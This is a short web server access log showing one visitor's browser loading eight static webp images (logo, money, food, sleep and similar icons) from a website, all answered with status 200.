106.102.11.87 - - [27/Jun/2024:18:00:44 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:00:44 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:00:44 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:00:44 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:00:44 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:00:44 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:00:44 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:00:44 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
